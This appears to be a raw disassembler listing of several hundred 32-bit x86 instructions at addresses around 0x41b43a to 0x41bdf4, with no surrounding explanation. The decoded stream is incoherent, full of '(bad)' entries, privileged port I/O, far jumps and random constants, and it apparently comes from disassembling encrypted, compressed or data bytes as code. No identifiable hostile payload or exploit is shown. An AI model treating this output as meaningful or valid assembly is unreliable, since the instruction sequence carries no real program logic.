  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	cs push ebp
  41b442:	and    bl,BYTE PTR [eax+0x126e4]
  41b448:	test   BYTE PTR [eax],0x0
  41b44b:	add    BYTE PTR [edi+0x42],ah
  41b44e:	mov    bh,al
  41b450:	popf   
  41b451:	push   0xffffff9d
  41b453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b454:	mov    dl,0xed
  41b456:	retf   0x72d0
  41b459:	pusha  
  41b45a:	mov    ch,0xc9
  41b45c:	nop
  41b45d:	and    ah,BYTE PTR [edx+0x369a2940]
  41b463:	dec    esi
  41b464:	inc    esp
  41b465:	sbb    al,0x4e
  41b467:	mov    BYTE PTR [eax],bl
  41b469:	push   ds
  41b46a:	pop    ebp
  41b46b:	call   0x840c7331
  41b470:	sbb    al,0xb9
  41b472:	mov    BYTE PTR [ebx-0xc08bff1],al
  41b478:	(bad)  
  41b47a:	sub    al,0x37
  41b47c:	ffreep st(0)
  41b47e:	cli    
  41b47f:	test   BYTE PTR [ebx+0x6d],cl
  41b482:	and    eax,DWORD PTR [edi]
  41b484:	addr16 mov eax,0x73e6f5e8
  41b48a:	push   esi
  41b48b:	add    al,BYTE PTR fs:[edx+0x72]
  41b48f:	xchg   edx,eax
  41b490:	inc    ebx
  41b491:	jl     0x41b4f5
  41b493:	ret    
  41b494:	xchg   esp,eax
  41b495:	xor    esp,edx
  41b497:	add    esi,edi
  41b499:	fsubr  st,st(1)
  41b49b:	in     eax,dx
  41b49c:	add    eax,0xb055e924
  41b4a1:	mov    gs,WORD PTR [edi]
  41b4a3:	out    dx,al
  41b4a4:	out    0x34,eax
  41b4a6:	ss int 0x93
  41b4a9:	shl    BYTE PTR [edx+eiz*4+0x30],0x9f
  41b4ae:	loop   0x41b472
  41b4b0:	push   ds
  41b4b1:	int3   
  41b4b2:	sti    
  41b4b3:	add    esi,ecx
  41b4b5:	out    0x2c,eax
  41b4b7:	call   0x5091:0x90101ccf
  41b4be:	cmp    al,0xe
  41b4c0:	outs   dx,DWORD PTR ds:[esi]
  41b4c1:	inc    ebx
  41b4c2:	js     0x41b481
  41b4c4:	test   BYTE PTR [esi+ebx*1-0x11],bh
  41b4c8:	mov    ds:0x5232d40,eax
  41b4cd:	(bad)  
  41b4ce:	xchg   ebx,eax
  41b4cf:	pop    ds
  41b4d0:	jmp    0x99d4046c
  41b4d5:	jp     0x41b4a0
  41b4d7:	inc    ebx
  41b4d8:	mov    esp,0xdd147196
  41b4dd:	dec    ebx
  41b4de:	into   
  41b4df:	cmp    eax,0x6c7657ac
  41b4e4:	push   edx
  41b4e5:	push   cs
  41b4e6:	popa   
  41b4e7:	leave  
  41b4e8:	fstp   QWORD PTR [ebp-0x53]
  41b4eb:	jmp    0x41b543
  41b4ed:	sbb    dh,BYTE PTR [edi]
  41b4ef:	bound  esp,QWORD PTR [ebx]
  41b4f1:	add    ah,BYTE PTR [edi+0x4e]
  41b4f4:	sub    al,0x90
  41b4f6:	mov    ebx,0x3edeb5ee
  41b4fb:	jmp    0xf7e5:0x1c802133
  41b502:	pop    ss
  41b503:	out    dx,al
  41b504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b505:	lods   al,BYTE PTR ds:[esi]
  41b506:	fcomp  DWORD PTR [esp+0x43]
  41b50a:	dec    esi
  41b50b:	shl    DWORD PTR [ebx-0x15],1
  41b50e:	mov    al,0xac
  41b510:	pop    ss
  41b511:	sub    edi,0xc3dcf73
  41b517:	(bad)  
  41b518:	inc    ecx
  41b519:	cmp    al,0x78
  41b51b:	into   
  41b51c:	jp     0x41b533
  41b51e:	push   ebp
  41b51f:	test   BYTE PTR [ebx-0xc58c504],ch
  41b525:	mov    dl,BYTE PTR [edi-0x4a1277fe]
  41b52b:	inc    ebx
  41b52c:	ja     0x41b4de
  41b52e:	jmp    0x361fe2cb
  41b533:	or     ecx,DWORD PTR [eax-0x6e]
  41b536:	jbe    0x41b4b9
  41b538:	jge    0x41b52e
  41b53a:	adc    eax,0xaad61ed6
  41b53f:	retf   0xfc54
	...
  41b5b2:	add    BYTE PTR [eax],al
  41b5b4:	pop    esp
  41b5b5:	sub    al,BYTE PTR [ecx]
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0x3a
  41b5c1:	in     eax,dx
  41b5c2:	and    ch,BYTE PTR [edx+ebx*8+0x27]
  41b5c6:	add    DWORD PTR [eax],eax
  41b5c8:	test   BYTE PTR [eax],0x0
  41b5cb:	add    ah,dh
  41b5cd:	push   esi
  41b5ce:	std    
  41b5cf:	imul   esp,eax,0xfffffff7
  41b5d2:	add    eax,ecx
  41b5d4:	xor    eax,0xae24464e
  41b5d9:	imul   ebp,edx,0xffffffcf
  41b5dc:	jmp    0xfcb41784
  41b5e1:	mov    ebx,0x1db90622
  41b5e6:	sahf   
  41b5e7:	outs   dx,DWORD PTR ds:[esi]
  41b5e8:	popa   
  41b5e9:	sub    al,0x2a
  41b5eb:	sub    al,0x31
  41b5ed:	cmp    eax,DWORD PTR [edx+ebx*2+0x737c8df8]
  41b5f4:	add    eax,0x41ac973c
  41b5f9:	iret   
  41b5fa:	js     0x41b5b2
  41b5fc:	xchg   edi,eax
  41b5fd:	adc    BYTE PTR [edx],ch
  41b5ff:	mov    esi,0xe136bb6e
  41b604:	into   
  41b605:	nop
  41b606:	mov    ah,0x2f
  41b608:	xchg   edx,eax
  41b609:	dec    ecx
  41b60a:	inc    edx
  41b60b:	mov    dh,BYTE PTR [ebx+0x5d]
  41b60e:	sub    ecx,edi
  41b610:	inc    edi
  41b611:	lahf   
  41b612:	add    edi,DWORD PTR [eax+0x6fc74d30]
  41b618:	cmp    al,0xb6
  41b61a:	clc    
  41b61b:	aad    0x10
  41b61d:	mov    al,0x7e
  41b61f:	repnz das 
  41b621:	mov    dl,0xff
  41b623:	aam    0xe4
  41b625:	and    eax,0xe359d3a6
  41b62a:	leave  
  41b62b:	pop    ds
  41b62c:	gs inc ecx
  41b62e:	push   0xf87083aa
  41b633:	imul   edx,DWORD PTR [ecx+0x16af6ced],0xffffffca
  41b63a:	xchg   edi,eax
  41b63b:	pop    ebx
  41b63c:	mov    esi,0xfaaccb55
  41b641:	jb     0x41b628
  41b643:	mov    ebx,0x45aaed9d
  41b648:	push   esi
  41b649:	jle    0x41b68e
  41b64b:	stc    
  41b64c:	shl    ebp,1
  41b64e:	adc    bl,BYTE PTR ds:0xe6863282
  41b654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b655:	int    0xc2
  41b657:	pushf  
  41b658:	nop
  41b659:	push   ss
  41b65a:	int    0x80
  41b65c:	xchg   edi,esp
  41b65e:	test   edx,esi
  41b660:	sahf   
  41b661:	lahf   
  41b662:	cli    
  41b663:	push   esi
  41b664:	idiv   dh
  41b666:	leave  
  41b667:	add    ebx,DWORD PTR [ebx+ecx*4]
  41b66a:	fbstp  TBYTE PTR [edx]
  41b66c:	lahf   
  41b66d:	mov    edx,0x96a2d6fd
  41b672:	mov    dl,0xb6
  41b674:	and    eax,0xa87af2de
  41b679:	push   ebx
  41b67a:	lea    ecx,[edi]
  41b67c:	scas   al,BYTE PTR es:[edi]
  41b67d:	inc    esi
  41b67e:	xchg   esi,eax
  41b67f:	sbb    eax,0xb8fee2b9
  41b684:	scas   eax,DWORD PTR es:[edi]
  41b685:	aas    
  41b686:	cmp    DWORD PTR [eax+0x1c],edx
  41b689:	stos   BYTE PTR es:[edi],al
  41b68a:	xor    dh,bh
  41b68c:	clc    
  41b68d:	xchg   edx,eax
  41b68e:	cs js  0x41b697
  41b691:	pop    ebx
  41b692:	enter  0xd941,0x28
  41b696:	sbb    ebp,edx
  41b698:	mov    al,ds:0x8d02a94f
  41b69d:	and    cl,BYTE PTR [bx+di+0x23b2]
  41b6a2:	mov    BYTE PTR [esi],ch
  41b6a4:	fld    DWORD PTR [ecx+0x474b6bf3]
  41b6aa:	add    BYTE PTR [esi-0x26],0xa9
  41b6ae:	ins    DWORD PTR es:[edi],dx
  41b6af:	push   ecx
  41b6b0:	clc    
  41b6b1:	mov    ch,0xe0
  41b6b3:	ret    
  41b6b4:	add    BYTE PTR [esi+0x1c],al
  41b6b7:	mov    ah,BYTE PTR [ebx-0x31629a2d]
  41b6bd:	jo     0x41b70c
  41b6bf:	mov    al,ds:0xf2c7
	...
  41b734:	repz xchg edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    BYTE PTR [esi-0x2fd44047],al
  41b745:	sub    BYTE PTR [ecx],al
  41b747:	add    dh,dh
  41b749:	add    BYTE PTR [eax],al
  41b74b:	add    al,cl
  41b74d:	lds    esp,FWORD PTR [ebx+0x74]
  41b750:	leave  
  41b751:	or     ecx,ebp
  41b753:	push   0x9cdf199e
  41b758:	daa    
  41b759:	dec    ebp
  41b75a:	inc    ebx
  41b75b:	ret    0x61c4
  41b75e:	adc    BYTE PTR ds:0x3584e8ac,ah
  41b764:	mov    BYTE PTR [edi+0x17ce1593],bl
  41b76a:	call   DWORD PTR [eax-0x1a]
  41b76d:	js     0x41b73b
  41b76f:	sub    bl,BYTE PTR [edx+0x2be571f9]
  41b775:	sub    ch,bh
  41b777:	cmp    DWORD PTR [edi-0x75],esi
  41b77a:	js     0x41b7d6
  41b77c:	repnz fld QWORD PTR [ecx-0x7c7a1982]
  41b783:	out    0xd5,al
  41b785:	aad    0x7c
  41b787:	adc    dh,al
  41b789:	je     0x41b79d
  41b78b:	aad    0x89
  41b78d:	retf   0xc383
  41b790:	mov    esp,0x516eb1c8
  41b795:	fcomp  st(4)
  41b797:	jge    0x41b7f9
  41b799:	fidiv  DWORD PTR [ecx]
  41b79b:	popf   
  41b79c:	mov    cl,0xee
  41b79e:	outs   dx,BYTE PTR ds:[esi]
  41b79f:	push   esi
  41b7a0:	fisub  WORD PTR ds:0x944f7cd3
  41b7a6:	int    0xfe
  41b7a8:	mov    ?,WORD PTR [eax+edi*8]
  41b7ab:	out    dx,al
  41b7ac:	jmp    0x57cf1209
  41b7b1:	es inc esi
  41b7b3:	into   
  41b7b4:	mov    ah,bl
  41b7b6:	int    0x10
  41b7b8:	(bad)  
  41b7b9:	in     al,dx
  41b7ba:	(bad)  
  41b7bb:	mov    edx,0x84fe65d2
  41b7c0:	ins    DWORD PTR es:[edi],dx
  41b7c1:	dec    eax
  41b7c2:	rcr    BYTE PTR [eax+0x4a942d92],0x5b
  41b7c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7ca:	jg     0x41b81c
  41b7cc:	push   ebx
  41b7cd:	push   ss
  41b7ce:	popf   
  41b7cf:	pop    edi
  41b7d0:	(bad)  
  41b7d1:	or     al,0xa5
  41b7d3:	nop
  41b7d4:	inc    ebx
  41b7d5:	jbe    0x41b7e2
  41b7d7:	pop    eax
  41b7d8:	adc    eax,0x260b5272
  41b7dd:	imul   eax,DWORD PTR [esi+0x92f1e7a],0x73b99a2a
  41b7e7:	push   0x1
  41b7e9:	or     BYTE PTR [ecx],0xf4
  41b7ec:	xor    ch,BYTE PTR [edi+0x5b]
  41b7ef:	fidiv  DWORD PTR [edx+ebp*1]
  41b7f2:	dec    eax
  41b7f3:	rcl    BYTE PTR [edi*8-0x25d27a40],cl
  41b7fa:	mov    ecx,edi
  41b7fc:	aas    
  41b7fd:	out    dx,al
  41b7fe:	fst    DWORD PTR [esp+0x39]
  41b802:	jecxz  0x41b7d0
  41b804:	push   edi
  41b805:	mov    al,ds:0x6d02b0cb
  41b80a:	hlt    
  41b80b:	mov    ecx,0x98e8e547
  41b810:	outs   dx,BYTE PTR ds:[esi]
  41b811:	mov    BYTE PTR [edx+0x56f667a2],dh
  41b817:	pop    ecx
  41b818:	loop   0x41b87b
  41b81a:	sub    esp,ebx
  41b81c:	add    al,0xfd
  41b81e:	es dec eax
  41b820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b821:	lds    eax,FWORD PTR [eax-0x4e]
  41b824:	dec    ebp
  41b825:	pop    ebp
  41b826:	in     eax,dx
  41b827:	mov    ds:0x27d56674,al
  41b82c:	loopne 0x41b7da
  41b82e:	clc    
  41b82f:	les    edx,FWORD PTR [ebp-0xedf74ae]
  41b835:	js     0x41b7c2
  41b837:	in     al,0xac
  41b839:	aam    0x36
  41b83b:	stos   DWORD PTR es:[edi],eax
  41b83c:	push   cs
  41b83d:	hlt    
  41b83e:	mov    bl,cl
  41b840:	cmc    
  41b841:	push   eax
	...
  41b8b2:	add    BYTE PTR [eax],al
  41b8b4:	xor    eax,0xcf4a867e
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	fmulp  st(7),st
  41b8c2:	cli    
  41b8c3:	sbb    al,0xc6
  41b8c5:	sub    DWORD PTR [ecx],eax
  41b8c7:	add    dh,dh
  41b8c9:	add    BYTE PTR [eax],al
  41b8cb:	add    BYTE PTR [ebp-0x40434f2],ch
  41b8d1:	sbb    BYTE PTR [eax+edi*4+0x10],dh
  41b8d5:	cmp    eax,0x699acb11
  41b8da:	(bad)  
  41b8db:	dec    edx
  41b8dc:	clc    
  41b8dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8de:	mov    bh,bh
  41b8e0:	pushf  
  41b8e1:	fcmovu st,st(3)
  41b8e3:	push   ecx
  41b8e4:	inc    esp
  41b8e5:	mov    BYTE PTR ds:0xda7faf5a,dl
  41b8eb:	(bad)  
  41b8ec:	retf   
  41b8ed:	mov    bh,0xe8
  41b8ef:	cmp    DWORD PTR [ebx-0x66],eax
  41b8f2:	xor    BYTE PTR [edi+0x2a4eb428],dl
  41b8f8:	jno    0x41b87c
  41b8fa:	jge    0x41b91d
  41b8fc:	mov    ds:0xb139af8a,eax
  41b901:	or     al,0x2f
  41b903:	(bad)
  41b906:	popa   
  41b907:	push   eax
  41b908:	jnp    0x41b8a7
  41b90a:	leave  
  41b90b:	mov    dl,0x73
  41b90d:	push   ebx
  41b90e:	xchg   edx,eax
  41b90f:	jecxz  0x41b95e
  41b911:	sub    BYTE PTR [ebp+0x1489fef7],bh
  41b917:	mov    ch,0xd4
  41b919:	in     eax,dx
  41b91a:	mov    ch,0x33
  41b91c:	stc    
  41b91d:	call   FWORD PTR [ebp+0x42]
  41b920:	fwait
  41b921:	mov    eax,ds:0x75bd198d
  41b926:	ins    DWORD PTR es:[edi],dx
  41b927:	dec    esp
  41b928:	adc    bh,BYTE PTR [ebx+edi*1+0x2f]
  41b92c:	and    al,0x56
  41b92e:	pop    ebx
  41b92f:	out    0x67,al
  41b931:	loop   0x41b965
  41b933:	dec    DWORD PTR [esi+0x2c]
  41b936:	pop    ss
  41b937:	ffreep st(2)
  41b939:	sbb    al,0xb5
  41b93b:	(bad)  [edx]
  41b93d:	scas   al,BYTE PTR es:[edi]
  41b93e:	mov    bl,0x9
  41b940:	mov    al,ds:0x4538596d
  41b945:	test   DWORD PTR [ebx+0x1285f9a9],0x80b5c798
  41b94f:	(bad)  
  41b951:	push   0x1f
  41b953:	sahf   
  41b954:	inc    esp
  41b955:	push   edx
  41b956:	inc    ebp
  41b957:	(bad)  
  41b958:	mov    edi,0xb9dcf6b
  41b95d:	pop    edi
  41b95e:	inc    esi
  41b95f:	neg    DWORD PTR [edx-0x537d42e0]
  41b965:	jnp    0x41b910
  41b967:	rol    DWORD PTR [ebx+eiz*8+0x42],0x58
  41b96c:	push   ebp
  41b96d:	sbb    eax,0xec80f181
  41b972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b973:	and    ah,BYTE PTR [ebx]
  41b975:	add    ecx,ebx
  41b977:	imul   edi,DWORD PTR [ecx+0x1ed029d8],0x313af2d3
  41b981:	les    edx,FWORD PTR [eax]
  41b983:	xchg   ecx,eax
  41b984:	(bad)  
  41b985:	mov    bh,0x7f
  41b987:	push   edi
  41b988:	frstor [ebx+0x7a]
  41b98b:	and    ah,BYTE PTR [edi-0x1871f60a]
  41b991:	inc    eax
  41b992:	ss jo  0x41b962
  41b995:	dec    edx
  41b996:	mov    bl,al
  41b998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b999:	cmp    al,0x72
  41b99b:	push   0xa
  41b99d:	stc    
  41b99e:	lea    ebp,[edi+0x7c6c3c9f]
  41b9a4:	dec    edx
  41b9a5:	jg     0x41b9db
  41b9a7:	jecxz  0x41b9f3
  41b9a9:	ins    BYTE PTR es:[edi],dx
  41b9aa:	push   ecx
  41b9ab:	xchg   ebx,eax
  41b9ac:	pop    edx
  41b9ad:	enter  0x276c,0x9d
  41b9b1:	std    
  41b9b2:	cwde   
  41b9b3:	pop    ds
  41b9b4:	pop    esi
  41b9b5:	ins    DWORD PTR es:[edi],dx
  41b9b6:	inc    esp
  41b9b7:	jns    0x41ba1b
  41b9b9:	adc    al,0x6f
  41b9bb:	mov    ebx,0x1548cc3
  41b9c0:	mov    bl,0x84
	...
  41ba32:	add    BYTE PTR [eax],al
  41ba34:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	pop    ebp
  41ba41:	or     dl,BYTE PTR [eax-0x79]
  41ba44:	mov    esp,0xf600012a
  41ba49:	add    BYTE PTR [eax],al
  41ba4b:	add    BYTE PTR [ecx-0x56f7f577],ah
  41ba51:	mov    ebx,0x58d950f
  41ba56:	mov    esi,0xb07febbf
  41ba5b:	mov    ds,WORD PTR [edi-0x28]
  41ba5e:	popf   
  41ba5f:	mov    ch,0x87
  41ba61:	inc    esp
  41ba62:	pop    ebp
  41ba63:	dec    ebx
  41ba64:	cmp    DWORD PTR [edi+0x6bd1b7c9],ecx
  41ba6a:	gs sahf 
  41ba6c:	test   al,0xf1
  41ba6e:	ins    BYTE PTR es:[edi],dx
  41ba6f:	imul   ecx,DWORD PTR [eax+0x79],0x4c4b1e31
  41ba76:	mov    ds:0xed2745a1,eax
  41ba7b:	add    DWORD PTR [eax],ebp
  41ba7d:	data16 in al,0x86
  41ba80:	adc    esi,esp
  41ba82:	pop    es
  41ba83:	ds cs add ch,bl
  41ba87:	cdq    
  41ba88:	jecxz  0x41ba88
  41ba8a:	jo     0x41ba3c
  41ba8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba8d:	mov    cl,0x1
  41ba8f:	pop    eax
  41ba90:	loopne 0x41ba28
  41ba92:	fimul  DWORD PTR [ecx]
  41ba94:	gs inc ecx
  41ba96:	popa   
  41ba97:	leave  
  41ba98:	cmp    BYTE PTR [eax],0x22
  41ba9b:	add    al,0x12
  41ba9d:	dec    edx
  41ba9e:	retf   
  41ba9f:	mov    al,0x33
  41baa1:	pop    ds
  41baa2:	add    dl,ch
  41baa4:	imul   ebp,DWORD PTR [eax],0xe5f74dd9
  41baaa:	rcr    BYTE PTR [esi],cl
  41baac:	outs   dx,DWORD PTR ds:[esi]
  41baad:	out    dx,eax
  41baae:	xor    eax,0xf24ee644
  41bab3:	shl    DWORD PTR [edi],0xdd
  41bab6:	cmp    al,0x8d
  41bab8:	(bad)  
  41bab9:	lahf   
  41baba:	mov    DWORD PTR [ebp+0x50],ebx
  41babd:	cmc    
  41babe:	jb     0x41ba98
  41bac0:	xchg   DWORD PTR [esi+0xe],edx
  41bac3:	lods   eax,DWORD PTR ds:[esi]
  41bac4:	jb     0x41bae1
  41bac6:	(bad)  [esi+0x4625e57f]
  41bacc:	sbb    al,0x5b
  41bace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bacf:	mov    ds:0xea0a79ed,eax
  41bad4:	add    al,0xcc
  41bad6:	inc    esp
  41bad7:	inc    edi
  41bad8:	clc    
  41bad9:	mov    edx,0xdeaeae8
  41bade:	sub    dh,ch
  41bae0:	pop    esp
  41bae1:	in     eax,0x7d
  41bae3:	fisttp QWORD PTR [edx]
  41bae5:	add    DWORD PTR [eax],eax
  41bae7:	fidivr WORD PTR [ebx-0x3]
  41baea:	pushf  
  41baeb:	ror    DWORD PTR [esi],0xf1
  41baee:	inc    ecx
  41baef:	jae    0x41ba9c
  41baf1:	mov    dl,0x89
  41baf3:	bound  edi,QWORD PTR [ebx+0x1d]
  41baf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baf7:	or     al,BYTE PTR [ecx-0x1f09d92b]
  41bafd:	out    dx,eax
  41bafe:	push   esi
  41baff:	test   BYTE PTR [esi],bl
  41bb01:	arpl   WORD PTR [ebp+0x17],ax
  41bb04:	jbe    0x41bb5b
  41bb06:	in     eax,0x6d
  41bb08:	pop    es
  41bb09:	jmp    0xbe6c:0xa9186c6a
  41bb10:	leave  
  41bb11:	cli    
  41bb12:	popa   
  41bb13:	xor    DWORD PTR [eax+0x794c6869],0x8ff1e066
  41bb1d:	mov    ah,0x71
  41bb1f:	add    BYTE PTR [edx-0x7f],0x46
  41bb23:	(bad)  
  41bb24:	pop    ss
  41bb25:	pop    ebp
  41bb26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb27:	mov    ?,WORD PTR [ebp+0x4a]
  41bb2a:	sbb    DWORD PTR gs:[esi-0x4e],0x35
  41bb2f:	add    BYTE PTR [eax+0x6a],al
  41bb32:	fist   WORD PTR [ecx]
  41bb34:	mov    BYTE PTR [ecx+edx*2+0x71],bh
  41bb38:	sbb    al,0xcf
  41bb3a:	fwait
  41bb3b:	inc    ebx
  41bb3c:	or     BYTE PTR [eax],al
  41bb3e:	(bad)  
  41bb3f:	push   cs
  41bb40:	stos   DWORD PTR es:[edi],eax
  41bb41:	pop    eax
	...
  41bbb2:	add    BYTE PTR [eax],al
  41bbb4:	push   0x49
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	lss    ebx,FWORD PTR [esi]
  41bbc3:	push   edx
  41bbc4:	mov    dl,0x2b
  41bbc6:	add    DWORD PTR [eax],eax
  41bbc8:	test   BYTE PTR [eax],0x0
  41bbcb:	add    BYTE PTR [ebp+0x9],bh
  41bbce:	xor    BYTE PTR [ebp-0x77],al
  41bbd1:	xchg   esi,eax
  41bbd2:	push   edx
  41bbd3:	jb     0x41bc1b
  41bbd5:	imul   BYTE PTR [edi-0x57]
  41bbd8:	lds    ecx,FWORD PTR [ebp+0x6d]
  41bbdb:	repz call 0x76af:0x33315895
  41bbe3:	in     al,0x76
  41bbe5:	cli    
  41bbe6:	add    dl,0xad
  41bbe9:	or     bl,BYTE PTR [eax+0x3f028866]
  41bbef:	mov    bl,0xee
  41bbf1:	(bad)  
  41bbf2:	pop    edi
  41bbf3:	je     0x41bc6b
  41bbf5:	sub    bh,0xfd
  41bbf8:	popf   
  41bbf9:	in     eax,dx
  41bbfa:	mov    ds:0x36b05456,al
  41bbff:	rol    DWORD PTR [ecx],1
  41bc01:	mov    dl,0x6a
  41bc03:	sahf   
  41bc04:	jbe    0x41bb99
  41bc06:	or     al,0x48
  41bc08:	sbb    BYTE PTR [esp+eiz*4+0x57981425],cl
  41bc0f:	add    DWORD PTR [ebx],0x54
  41bc12:	push   edi
  41bc13:	in     al,dx
  41bc14:	ja     0x41bbde
  41bc16:	cs fs mov ah,0x27
  41bc1a:	popf   
  41bc1b:	and    al,0xa5
  41bc1e:	cs jg  0x41bc74
  41bc21:	pop    ebp
  41bc22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc23:	xlat   BYTE PTR ds:[ebx]
  41bc24:	fcomip st,st(3)
  41bc26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc27:	xor    ah,BYTE PTR [edx]
  41bc29:	lods   eax,DWORD PTR ds:[esi]
  41bc2a:	gs dec ecx
  41bc2c:	mov    eax,0xa7551b6a
  41bc31:	pop    esi
  41bc32:	mov    edi,0x19989d03
  41bc37:	fist   WORD PTR [ebx+0x45]
  41bc3a:	xchg   esp,eax
  41bc3b:	pop    eax
  41bc3c:	inc    edx
  41bc3d:	push   esp
  41bc3e:	xor    ebp,DWORD PTR [edx]
  41bc40:	xor    esi,DWORD PTR [eax+0x16]
  41bc43:	in     al,0xfb
  41bc45:	jno    0x41bc87
  41bc47:	cli    
  41bc48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc49:	inc    ebp
  41bc4a:	dec    ecx
  41bc4b:	imul   ebp,esi,0x703180ca
  41bc51:	mov    ds:0x7f3e060b,eax
  41bc56:	mov    DWORD PTR [edi-0x14],0x8a070458
  41bc5d:	les    edx,FWORD PTR [esi-0x3a752186]
  41bc63:	mov    bl,0x82
  41bc65:	jge    0x41bc42
  41bc67:	(bad)
  41bc6a:	in     al,0x39
  41bc6c:	sub    eax,0x235839f3
  41bc71:	sbb    eax,0xcd5eabb5
  41bc76:	inc    esp
  41bc77:	jbe    0x41bc6a
  41bc79:	xchg   esp,eax
  41bc7a:	retf   0x77c6
  41bc7d:	and    edx,DWORD PTR [ebp-0x34fccdc8]
  41bc83:	aaa    
  41bc84:	ret    
  41bc85:	or     ebp,DWORD PTR [edi]
  41bc87:	and    eax,0x572b6e74
  41bc8c:	or     BYTE PTR [esp+ebx*8-0x3e],dl
  41bc90:	das    
  41bc91:	pushf  
  41bc92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc93:	cmp    ah,dl
  41bc95:	xchg   esi,eax
  41bc96:	retf   
  41bc97:	xor    al,0xae
  41bc99:	test   al,0x30
  41bc9b:	sbb    DWORD PTR [eax],ecx
  41bc9d:	das    
  41bc9e:	cli    
  41bc9f:	lock aaa 
  41bca1:	jge    0x41bcd9
  41bca3:	mov    dl,0xf8
  41bca5:	lahf   
  41bca6:	mov    BYTE PTR [edi],cl
  41bca8:	fild   WORD PTR [ecx+0x41]
  41bcab:	mov    cl,BYTE PTR [ebp-0x72]
  41bcae:	mov    edi,DWORD PTR [ecx]
  41bcb0:	mov    ds:0x1dd7f191,eax
  41bcb5:	or     al,0x3c
  41bcb7:	inc    esi
  41bcb8:	div    BYTE PTR [eax]
  41bcba:	sbb    edx,DWORD PTR [edi]
  41bcbc:	ret    
  41bcbd:	sti    
  41bcbe:	push   esp
  41bcbf:	lods   eax,DWORD PTR ds:[esi]
  41bcc0:	fisttp WORD PTR [ebx+0x0]
	...
  41bd32:	add    BYTE PTR [eax],al
  41bd34:	push   ebp
  41bd35:	clc    
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0x2cbf1c9a
  41bd41:	xor    eax,0x2ca84f93
  41bd46:	add    DWORD PTR [eax],eax
  41bd48:	test   BYTE PTR [eax],0x0
  41bd4b:	add    BYTE PTR [ecx-0x46],al
  41bd4e:	mov    esi,0x77f93704
  41bd53:	push   ds
  41bd54:	scas   eax,DWORD PTR es:[edi]
  41bd55:	sbb    eax,0x84962e5e
  41bd5a:	dec    ebp
  41bd5b:	push   cs
  41bd5c:	aad    0x2b
  41bd5e:	push   esi
  41bd5f:	call   0xd0fe:0xcb52d6e
  41bd66:	lock cs inc ecx
  41bd69:	and    al,0x5f
  41bd6b:	fidivr DWORD PTR [ebp+0x3b08163a]
  41bd71:	jge    0x41bd8d
  41bd73:	add    DWORD PTR [eax+eiz*8-0x2bccce66],edx
  41bd7a:	sti    
  41bd7b:	(bad)  
  41bd7c:	loope  0x41bdce
  41bd7e:	dec    eax
  41bd7f:	sbb    edi,esi
  41bd81:	push   esi
  41bd82:	mov    bl,0x4e
  41bd84:	dec    ebp
  41bd85:	mov    cl,0xd
  41bd87:	cmp    eax,0xef50a4bb
  41bd8c:	out    dx,eax
  41bd8d:	xor    esi,DWORD PTR [eax-0x71d2053]
  41bd93:	ror    ebp,cl
  41bd95:	imul   DWORD PTR [edi-0x4d27c084]
  41bd9b:	lods   eax,DWORD PTR ds:[esi]
  41bd9d:	xor    eax,0x6695eddc
  41bda2:	sub    dl,cl
  41bda4:	int3   
  41bda5:	es pop ebx
  41bda7:	mov    ebx,DWORD PTR [eax]
  41bda9:	or     BYTE PTR [ebx],cl
  41bdab:	xchg   DWORD PTR [edi],ecx
  41bdad:	mov    ch,0x8c
  41bdaf:	fistp  QWORD PTR [esi-0x6d40441a]
  41bdb5:	leave  
  41bdb6:	int3   
  41bdb7:	add    al,0x4d
  41bdb9:	xchg   ah,dl
  41bdbb:	lods   al,BYTE PTR ds:[esi]
  41bdbc:	out    0xa5,eax
  41bdbe:	clc    
  41bdbf:	fbld   TBYTE PTR [esp+edx*1]
  41bdc2:	or     al,0x8e
  41bdc4:	ja     0x41bdf0
  41bdc6:	mov    cl,0xd0
  41bdc8:	jl     0x41bdc8
  41bdca:	and    eax,0x6c838143
  41bdcf:	push   eax
  41bdd0:	mov    ebp,0xfe0802bb
  41bdd5:	jne    0x41bdda
  41bdd7:	repz mov ecx,0xf8dcb4af
  41bddd:	lods   eax,DWORD PTR ds:[esi]
  41bdde:	jecxz  0x41bddd
  41bde0:	in     eax,0x9f
  41bde2:	mov    bl,0x7b
  41bde4:	jg     0x41be5d
  41bde6:	into   
  41bde7:	xor    eax,0x9b782e8d
  41bdec:	add    bh,BYTE PTR [esi]
  41bdee:	cwde   
  41bdef:	sub    bh,bh
  41bdf1:	pop    DWORD PTR [ebx]
  41bdf3:	push   cs
  41bdf4:	fwait
